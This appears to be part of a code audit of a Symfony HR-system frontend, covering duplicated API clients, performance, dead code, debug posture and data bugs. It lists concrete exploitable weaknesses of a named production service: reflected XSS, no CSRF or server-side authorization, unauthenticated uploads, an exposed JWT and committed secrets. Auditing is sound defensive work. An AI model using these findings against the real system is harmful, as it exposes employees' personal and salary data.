Three overlapping implementations of "call the HRIS API":

1. `src/Service/APIRequest.php` + `src/Service/APIFunctions.php` (44 wrappers).
2. `src/Controller/AdministrationController.php` L938-1050 — **16 private methods that duplicate
   `APIFunctions` byte-for-byte** and are never called (the controller uses `$this->apiFunctions`).
3. `public/assets/js/api.js` — `apiCall()`, a second client with its own base URL, its own error
   handling (`showToast` on failure) and its own token cache.

Plus `PayrollController` which bypasses all of them. The same endpoint therefore has up to four
different failure behaviours. `getAffiliatedCompany()` and `getCompanyList()` in `APIFunctions` are also
exact duplicates.

Duplicated PHP: `setSessionVariables()` exists identically in `HomeController` (L428-442) and
`SessionListener` (L85-99).

Duplicated Twig/JS: the ~30-line `Toastify({...})` flash-reading block is copy-pasted into ~20 templates
with only the message text changed, instead of living in `global_functions.js`.

### 10.8 The polymorphic `apiRequest()` return type causes hard 500s (High)

`ResponseInterface|array` forces every caller to type-check, and dozens don't:

```php
$dashboard_count = $this->apiService->apiRequest('GET', 'api/dashboard', [], $token)->toArray();
if($this->apiFunctions->getDivision($request)->getStatusCode() === 200){
```

Any API outage, 401 (expired token), 404 or 500 turns these into
`Error: Call to a member function getStatusCode() on array` → HTTP 500 white page, with
`APP_DEBUG=1` committed so a full stack trace (including the base URL and session contents) may be shown.

### 10.9 Two mandatory API round-trips per page (High, performance)

`SessionListener` (`POST api/revalidate-session`) on `kernel.request` **and** `NotificationListener`
(`GET api/notifications/find-by-employee/{id}`) on `kernel.response` fire for **every** request,
including AJAX, redirects and file downloads. Since `HttpClient::create()` builds a fresh client each
time, there is no connection reuse. On `/employee/profile/{code}` this means **15 sequential HTTP calls**
before the page is returned. There are no timeouts configured, so a hung API hangs the whole frontend.

### 10.10 Files stored on the frontend, in the web root (High)

`uploadAttachment()` moves 201-file attachments to `public/uploads/{empCode}/{originalName}` and sends the
**absolute local path** to the API. Therefore:

* Attachments are served by the web server directly, **with no authentication**, to anyone who guesses
  `/uploads/EMP0092/Contract.pdf`.
* The API stores a path that only makes sense on one specific frontend host — horizontal scaling or
  moving the frontend breaks every stored attachment.
* Filenames come from `$file->getClientOriginalName()` with only an extension whitelist; there is no
  name sanitisation beyond `pathinfo(..., PATHINFO_FILENAME)` + `guessExtension()`.
* Four generated `Manpower_Monitoring_Report_*.xlsx` files are committed into `public/` (§9.6).

### 10.11 Session/auth UX defects (Medium)

* Unauthenticated requests get **HTTP 200 with the login page inlined at the original URL** instead of a
  302 to `/login` — breaks back/forward, bookmarking, and any client that follows status codes.
* Logout does not revoke the JWT at the API.
* `cachedToken` in `api.js` is never invalidated → Direct-JS screens keep using an expired token.
* `HomeController::revalidateSession()` applies a `["SADM","ADM","HR"]` allow-list that the actual login
  path has commented out — inconsistent policy between two code paths.
* `resetPassword()` renders the "set new password" screen whenever `?isValid=&status=` are present,
  skipping token validation (§4.6).
* `ErrorController::error()` redirects to the raw `Referer` header.

### 10.12 Dead code, duplicates and structural noise (Medium)

* `AuthorizationCheck` — never registered, never triggered.
* `SessionManager` — unbindable constructor arg, zero references (only a commented-out `new SessionManager(...)`
  in `SuperAdminController` L265).
* `HomeController::renderErrorPageWithToast()` — private, never called, mixes SweetAlert + a CDN script tag.
* `HomeController` catch-all `#[Route('/{path}')]` — commented out but preserved.
* SweetAlert2 loaded on 5 pages, `Swal.` used 0 times.
* Stimulus/Encore configured but unused; all assets are hand-copied into `public/assets/`.
* Doctrine ORM/DBAL/migrations required in `composer.json`, `DATABASE_URL` set, `migrations/` present —
  but `DoctrineBundle` is not registered and `src/Entity`, `src/Repository` are empty.
* **Duplicate route declarations** (later wins, earlier is silently dead):
  * `EmployeeProfileController` — `/form/submit/upload_attachment` name `upload_attachment` twice (L275 commented, L363 live).
  * `LeavePolicyController` — `/leave-policy/create` name `app_leave_policy_create` twice; the first posts to `api/pagibigconfig/create` and redirects to `app_pagibig_config` (copy-paste from `PagibigConfigController`).
  * `ManpowerController` — `manpower/employee-project/{id}` name `app_emp_project_id` twice (L174, L201).
  * **Cross-controller path collision**: `/profile-update-overtime-request` is declared by both
    `EmployeeProfileController` (name `update_overtime_request`) and `OvertimeRequestController`
    (name `update_overtime_request_v2`).
* `-v2` methods living beside their originals (`updateSalaryAdjustment` / `updateSalaryAdjustmentV2`).
* Hundreds of lines of commented-out code, including three full alternative bodies of
  `APIRequest::apiRequest()` and ~6 obsolete report generators in `ExportXLSService`.
* Mixed language comments (English/Tagalog).
* Inconsistent route paths — some with a leading `/`, some without.
* `use Symfony\Component\Routing\Annotation\Route` (deprecated in 6.4/7.x) in `HomeController`,
  `PayrollController`, `ErrorController`, `Employee201Controller`; `...\Attribute\Route` elsewhere.

### 10.13 Debug/production posture (Medium)

* `.env` commits `APP_ENV=dev` and `APP_DEBUG=1`. If deployed as-is, the Web Profiler toolbar,
  `_profiler` routes and full stack traces (with the API base URL, session and headers) are exposed.
* `console.log(JSON.stringify(jsonData))` in `apiCall()` logs **every request payload** — including
  salary and personal data — to the browser console. `permission.js` logs the whole permission matrix.
* `AlertListener` rewrites the body of every response, including multi-MB XLSX downloads.
* Temp spreadsheet files from `tempnam()` are never deleted.
* No structured logging, no correlation ids, no metrics; `LoggerInterface` is injected into most
  controllers and used only in `SessionListener` and `EmployeeProfileController`.

### 10.14 Data-handling and correctness bugs (Low–Medium)

* `GET` requests carry a JSON body (`api/timesheet`, `api/payrollsheet`, `api/employee/profile`, …) —
  works with `symfony/http-client` and jQuery but is non-standard, uncacheable, and breaks through
  most proxies/CDNs.
* `apiRequest()` receives `[]` (a PHP array) as `$jsonBody` in several places while the header says
  `application/json` — `symfony/http-client` would encode it as form data.
* Hardcoded 2024 date fallbacks in all 10 payroll report generators.
* `PayrollController::viewEmployeePayroll()` returns `null` on a non-200 API response → framework error.
* `EmployeeProfileController` employee cache is written but the read is commented out; the cache key
  (`employee_{code}`) is not scoped to the requesting user.
* `_notification-area` always shows the "new notifications" pulse dot, and its data is one page-load stale.
* `permission.js` ignores 6 marker classes present in the markup (`view-category`, `view-project`,
  `view-humanres`, `view-administration`, `view-list`, `view-salary`).
* `view-shifts` / `view-emp_settings` are overloaded as generic markers for 17 unrelated menu items (§6.4.2).
* Path segments are interpolated into API URLs without `urlencode()`.
* No pagination on most list screens; `EmployeeProfileController` fetches every leave policy, every
  overtime request in the system (`getOvertimeRequest()` rather than `getOvertimeRequestByEmp()` —
  the per-employee call is commented out at L187).

---

## 11. Quick answers to the brief

1. **Client↔server model** — *Hybrid, predominantly server-side proxy.* ~205 PHP call sites route
   through `App\Service\APIRequest` to `http://127.0.0.1:8000/` (prod: `https://hris-services.wrldcapitalholdings.com/`);
   **40 JS call sites bypass Symfony entirely** and hit the API from the browser via
   `public/assets/js/api.js::apiCall()`, using a JWT fetched from `GET /validate_call`. No `fetch`, no
   `axios`, no SPA framework — plain **jQuery 3.7.1 `$.ajax`**.
2. **Auth** — Login is a native form POST to `/validate_login` → `POST api/login` → JWT + RBAC matrices
   stored in a **plaintext native PHP file session**. Sent as `Authorization: Bearer <jwt>` by both PHP
   and JS. Logout only invalidates the local session. Unauthenticated users are **not redirected**: a
   `kernel.request` listener renders the login page inline with HTTP 200. Every request triggers
   `POST api/revalidate-session`.
3. **Frontend RBAC** — `AuthorizationCheck` is **dead code**. Real gating is (a) three Twig `{% if %}`
   checks on `main_module_access` / `userTypeCode` in `_sidebar.html.twig`, and (b)
   `public/assets/js/permission.js`, which reads `data-user-permissions` / `data-user-sub-permission`
   off `<body>` and `display:none`s elements by `view-/add-/edit-/delete-/action-<module>` CSS classes.
   **No controller performs any permission check.**
4. **Forms** — Pattern A: native `<form method="post" action="{{ path('submit_division') }}">` →
   Symfony route → `POST api/division/create` → 302 with `?status&message`. Pattern B: `$.ajax` to a
   Symfony `JsonResponse` route. Pattern C: `apiCall()` straight to the API. Zero CSRF tokens; no
   Symfony Form component.
5. **Notifications/toasts** — `NotificationListener` writes `session['notification_message']` on every
   response; `partials/_notification-area.html.twig` renders it (always one page stale).
   **Toastify-JS only** via `showToast()` in `api.js`; SweetAlert2 is loaded but never invoked.
   Four parallel messaging channels (query-string→`AlertListener`, `javascriptSnippet|raw`, flash bag +
   per-template inline `Toastify`, AJAX JSON).
6. **SSR data flow** — Controllers decode API JSON with `->toArray()` and pass raw sub-arrays into
   `render()`; Twig dot-notation reads them. No DTOs/view models, inconsistent naming
   (`emp_list_payroll`, `leaveRequests`, `employeeData`, `shiftList`, …), a vestigial `controller_name`
   in ~15 renders, and `javascriptSnippet` HTML built in PHP.
7. **Weak spots** — JWT exposed to JS via `/validate_call`; token in plaintext file sessions; reflected
   XSS in `AlertListener`; zero CSRF; zero server-side authorization; three hardcoded base URLs +
   committed SMTP password + `APP_SECRET`; triple-duplicated API client logic; polymorphic
   `apiRequest()` return causing 500s; two mandatory API round-trips per page; uploads served
   unauthenticated from `public/`; extensive dead code and duplicate routes. Full detail in §10.
